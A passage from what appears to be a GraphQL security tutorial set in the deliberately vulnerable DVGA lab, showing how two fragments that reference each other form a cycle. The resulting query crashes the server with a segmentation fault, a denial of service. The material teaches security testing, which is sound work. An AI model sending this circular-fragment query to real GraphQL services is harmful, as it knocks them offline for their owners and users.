Let’s explore how fragments can be constructed to form a cycle and lead to a DoS. In DVGA, run the following query, which uses a fragment named Start on the object PasteObject. The pastes field utilizes this fragment using the ...Start syntax:

```
query {
  pastes {
    ...Start
  }
}

fragment Start on PasteObject {
  title
  content
}
```

When the query is executed, it returns the field and content fields of pastes:

```
"pastes": [
  {
    "title": "My Title",
    "content": "My First Paste"
  }
]
```

Now, what if we add another fragment named End that uses the Start fragment, and modify the Start fragment to use the End fragment? An interesting condition will occur here:

```
query CircularFragment {
  pastes {
    ...Start
  }
}

fragment Start on PasteObject {
  title
  content
  ...End
}

fragment End on PasteObject {
  ...Start
}
```

This condition leads to an infinite execution, just as the GraphQL specification suggests. Try experimenting with this query in the lab.

NOTE Executing this query will immediately crash DVGA with a segmentation fault error. Make sure to execute it only in the virtual lab. After you run the query, DVGA should no longer be available. To start it again, simply follow the steps from Chapter 2 to create another Docker container.